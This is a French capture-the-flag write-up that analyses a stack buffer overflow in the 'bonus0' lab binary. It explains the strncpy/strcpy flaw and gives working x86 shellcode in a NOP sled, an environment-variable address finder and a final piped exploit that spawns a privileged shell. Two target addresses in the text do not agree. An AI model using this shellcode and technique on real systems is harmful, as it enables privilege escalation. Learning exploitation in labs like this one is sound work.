# bonus0

## Objectif

Lire le fichier `.pass` de l'utilisateur suivant pour obtenir son mot de passe.

## 1. Analyse

Le programme lit **deux** lignes d'inputs, les **concatène** et affiche le
résultat. Trois fonctions : `main` → `pp` → `p` (appelée deux fois).

### Vue d'ensemble

```
main  ── pp(buffer)
           ├─ p(buffer1, " - ")        // 1ère lecture
           ├─ p(buffer2, " - ")        // 2ème lecture
           ├─ strcpy(buffer, buffer1)  // copie buffer1
           ├─ buffer[len] = ' '        // séparateur
           └─ strcat(buffer, buffer2)  // ajoute buffer2
      ── puts(buffer)                  // affiche le tout
```

### `main`

```asm
080485a4 <main>:
 80485aa:  sub    $0x40,%esp          ; frame de 64 octets
 80485ad:  lea    0x16(%esp),%eax     ; buffer = esp+0x16  (le buffer de sortie)
 80485b4:  call   804851e <pp>        ; pp(buffer)
 80485c0:  call   80483b0 <puts@plt>  ; puts(buffer)
```

`main` réserve une frame de 64 octets (`sub $0x40`) et place le buffer à
`esp+0x16`. Les 22 (`0x16`) octets du bas servent à passer les arguments aux appels (`pp`, `puts`) et à l'alignement. Il reste donc `0x40 − 0x16 = 42` octets → **`char buffer[42]`**.

`main` passe le buffer à `pp` qui le remplit, puis l'affiche avec `puts`. **C'est ce
buffer, trop petit, qui va déborder.**

### `pp` — les deux lectures et la concaténation

```asm
0804851e <pp>:
 8048526:  movl   $0x80486a0,0x4(%esp) ; 2e arg = " - "  (le prompt)
 804852e:  lea    -0x30(%ebp),%eax     ; buffer1 = ebp-0x30
 8048534:  call   80484b4 <p>          ; p(buffer1, " - ")
 8048541:  lea    -0x1c(%ebp),%eax     ; buffer2 = ebp-0x1c
 8048547:  call   80484b4 <p>          ; p(buffer2, " - ")
 8048559:  call   80483a0 <strcpy@plt> ; strcpy(buffer, buffer1)
 8048579:  repnz  scas %es:(%edi),%al  ; strlen(buffer) inliné
 8048588:  mov    %dx,(%eax)           ; écrit le séparateur a la fin
 8048598:  call   8048390 <strcat@plt> ; strcat(buffer, buffer2)
```

`pp` lit deux chaînes (dans `buffer1` et `buffer2`), puis construit dans le
buffer de `main` : `buffer1` + séparateur + `buffer2`. Détail capital :
`buffer1` (`ebp-0x30`) et `buffer2` (`ebp-0x1c`) sont distants de
**`0x30 - 0x1c = 0x14 = 20` octets → ils sont collés** (20 octets chacun).

*(Le `repnz scas` est un `strlen` mis en ligne par le compilateur : il parcourt
la chaîne jusqu'au `\0` pour trouver sa longueur, afin de placer le séparateur.)*

### `p` — la lecture et le `strncpy` fautif

```asm
080484b4 <p>:
 80484c3:  call   80483b0 <puts@plt>   ; puts(" - ")   -> affiche le prompt
 80484e1:  call   8048380 <read@plt>   ; read(0, buffer, 4096)
 80484f7:  call   80483d0 <strchr@plt> ; strchr(buffer, '\n')
 80484fc:  movb   $0x0,(%eax)          ; *resultat = '\0'  (remplace le '\n')
 8048517:  call   80483f0 <strncpy@plt>; strncpy(dest, buffer, 20)
```

En C (voir `source.c`) :

```c
puts(b);                        // prompt " - "
read(0, buffer, 4096);          // lit la saisie
retaddr = strchr(buffer, 10);   // cherche le '\n'
*retaddr = '\0';                // le remplace par une fin de chaine
strncpy(a, buffer, 20);         // copie 20 octets dans a
```

### Les fonctions de la libc utilisées

| Fonction | Rôle | Point sensible |
|---|---|---|
| `puts(s)` | affiche `s` suivi d'un `\n` | — |
| `read(fd, buf, n)` | lit **≤ `n`** octets de `fd` dans `buf` | n'ajoute **pas** de `\0` |
| `strchr(s, c)` | pointeur sur la 1ère occurrence de `c`, sinon **NULL** | `*NULL` → crash si pas de `\n` |
| `strncpy(d, s, n)` | copie **≤ `n`** octets | **pas de `\0` si `s` fait ≥ `n`** |
| `strcpy(d, s)` | copie `s` **jusqu'au `\0`** (non borné) | déborde si la source n'a pas de `\0` |
| `strlen(s)` | longueur jusqu'au `\0` | — |
| `strcat(d, s)` | ajoute `s` à la fin de `d` (non borné) | déborde |

### La racine du problème

**1. `strncpy(dest, buffer, 20)` n'ajoute pas de `\0`.** Si la saisie fait **≥ 20
caractères**, `strncpy` copie 20 octets **et s'arrête, sans terminateur**. Le
buffer de destination n'est donc **pas une chaîne valide**.

**2. Le `\0` attendu est « contourné ».** Le `\n` de la ligne est bien transformé
en `\0` (via `strchr` + `movb $0x0`), mais **dans le tampon de 4096 octets**, à
la position du `\n` — c'est-à-dire **après** les 20 premiers octets. Or `strncpy`
ne copie que ces 20 premiers : le `\0` n'est **jamais** recopié dans `dest`.

**3. `buffer1` et `buffer2` sont collés.** Comme `buffer1` (20 octets) n'a pas de
`\0`, le `strcpy(buffer, buffer1)` de `pp` **ne trouve pas de fin** et **continue
dans `buffer2`** (juste derrière) → il copie **≈ 40 octets** d'un coup. Puis
`strcat` rajoute encore `buffer2`.

**4. Le buffer de `main` est trop petit.** `main` ne réserve qu'un petit buffer
pour recevoir `buffer1 + " " + buffer2`. Amplifié par le `\0` manquant, `pp` y
écrit plus que sa capacité → **débordement de la pile de `main`** jusqu'à son
**adresse de retour**.

**En une phrase :** `strncpy(…, 20)` oublie le `\0` dès 20 caractères, donc
`strcpy` recopie `buffer1` **et** `buffer2` collés (≈ 40 octets) dans le petit
buffer de `main` → la pile déborde et on réécrit l'**adresse de retour**. Comme
la place est réduite, on logera le **shellcode dans une variable d'environnement**
et on fera pointer l'adresse de retour dessus.

## 2. Exploitation

### a. La stratégie

On sait maintenant qu'on peut **écraser l'adresse de retour** de `main`. Reste à
choisir **où la faire pointer**.

Le binaire est setuid `bonus1`, et le protection NX est désactivée → on veut
exécuter un **shellcode** (les octets qui lancent `/bin/sh`). Problème : le buffer
de `main` est **minuscule** (42 octets) et, à cause du bug de `strncpy`, on ne
maîtrise pas proprement ce qui y est écrit. Impossible d'y loger confortablement
un shellcode de 41 octets.

**Solution :** on place le shellcode dans une **variable d'environnement**. Les
variables d'environnement sont copiées **tout en haut de la pile** au lancement du
programme, à une adresse stable (pas d'ASLR ici). On n'a alors plus qu'à faire
pointer l'adresse de retour écrasée **vers cette variable**.

### b. Placer le shellcode dans l'environnement

On réutilise le shellcode du level2 (41 octets, setuid + `execve("/bin/sh")`,
sans octet nul), précédé d'un **sled de NOP** (`\x90`) de 200 octets.

> **Rappel** — `NOP` (*No Operation*, octet `\x90` en x86) est une instruction qui **ne fait
> rien** : le processeur la lit, avance d'un octet, et passe à la suivante jusqu'à
> atteindre le shellcode placé juste après. Sans NOP, il faudrait viser
> l'adresse **exacte** du 1ᵉʳ octet du shellcode (quasi impossible, l'adresse
> variant légèrement d'un lancement à l'autre) ; avec lui, **viser « à peu près »
> le milieu suffit**.

```sh
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
```

### c. Trouver l'adresse du shellcode

On compile un petit programme qui ne fait qu'une chose : afficher l'adresse d'une
variable d'environnement avec `getenv`.

```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char **argv) {
    printf("%p\n", getenv(argv[1]));
}
```

```sh
gcc /tmp/getenv.c -o /tmp/getenv
/tmp/getenv SHELLCODE        # SHELLCODE -> 0xbffff...
```

⚠️ Cette adresse (`0xbffff...`) est celle vue par `/tmp/getenv`, dont le **nom est
plus long** que `./bonus0`. Or le nom du programme est lui aussi poussé sur la
pile, **sous** l'environnement : un nom plus court décale l'environnement vers des
adresses **plus hautes**. L'adresse réelle dans `bonus0` sera donc un peu
différente — et c'est précisément pour absorber cet écart qu'on a mis 200 NOP.

On vise le **milieu du sled NOP** : `0xbffff... + 0x64 = 0xbffff...` (soit
100 octets de NOP devant, 100 derrière).

### d. Trouver l'offset de l'adresse de retour

On envoie un **motif** (`AAAABBBB…`, chaque fragment de 4 est unique) en
le tapant **interactivement** dans gdb — il faut taper les deux lignes à la main,
l'une après l'autre, car le programme fait **deux `read` distincts** (un seul flux
collé serait avalé d'un coup par le premier `read`).

```console
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAA     <- 1ère saisie : 20 'A' (remplit buffer1)
 -
AAAABBBBCCCCDDDDEEEE     <- 2e saisie : le motif par blocs (20 octets)

Program received signal SIGSEGV, Segmentation fault.
0x44434343 in ?? ()
```

`EIP = 0x44434343`. En little-endian, du poids faible vers le fort, ce sont les
octets `43 43 43 44` = `'C' 'C' 'C' 'D'` = **`"CCCD"`**.

On met chaque octet de la 2ᵉ saisie en face de sa position :

```
2e saisie :  A  A  A  A  B  B  B  B  C  C  C  C  D  D  D  D  E  E  E  E
offset    :  0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19
                                       └──────┴── EIP = C C C D ──┘
```

`EIP` a capturé `C C C D` = les octets des offsets **9, 10, 11, 12** (trois `C`
puis le premier `D`). L'adresse de retour commence donc à l'**offset 9**.

### e. Construire et lancer l'exploit

On assemble les deux saisies :

- **1ère saisie** : 20 `A` → remplit `buffer1` à ras bord, **sans `\0`** (c'est le
  déclencheur du bug, cf. partie 1).
- **2ᵉ saisie** : `9 octets` de padding + l'adresse retourné par getenv + 100 NOP (soit `0xbffff7bc` dans notre example) + `7 octets` de padding → total **20 octets**, pour que `buffer2` reste lui aussi **sans `\0`**
  (sinon `strncpy` le complète de `\0` et le débordement ne se propage pas pareil).
  Les 4 octets de l'adresse tombent pile sur l'adresse de retour de `main`.

Comme il y a **deux `read`**, on ne peut pas tout envoyer d'un bloc : on sépare les
deux lignes par un `sleep 1` pour que le premier `read` ne consomme que la première.
Le `cat` final garde l'entrée ouverte pour piloter le shell obtenu.

```sh
{ python -c 'print "AAAAAAAAAAAAAAAAAAAA"'; sleep 1; python -c 'print "A"*9 + "\xbc\xf7\xff\xbf" + "A"*7'; cat; } | ./bonus0
```

Déroulé : `pp` recopie `buffer1`+`buffer2` collés dans le buffer de 42 octets de
`main` → débordement → l'adresse de retour de `main` devient `0xbffff821` → au
`ret`, l'exécution saute sur le toboggan de NOP de la variable `SHELLCODE`, glisse
jusqu'au shellcode, et lance `/bin/sh` avec les droits `bonus1`.

```sh
whoami
cat /home/user/bonus1/.pass
```

Le mot de passe récupéré est à reporter dans le fichier `flag`.

## Nature de la faille

`strncpy(dest, src, 20)` n'ajoute pas de `\0` quand la source fait ≥ 20 octets :
`buffer1` reste non terminé, donc le `strcpy` de `pp` recopie `buffer1` **et**
`buffer2` collés (≈ 40 octets) dans le buffer de 42 octets de `main` → débordement
de pile et écrasement de l'adresse de retour. Le buffer étant trop petit pour le
shellcode, on le loge dans une variable d'environnement (avec un toboggan de NOP)
et on redirige l'adresse de retour dessus.
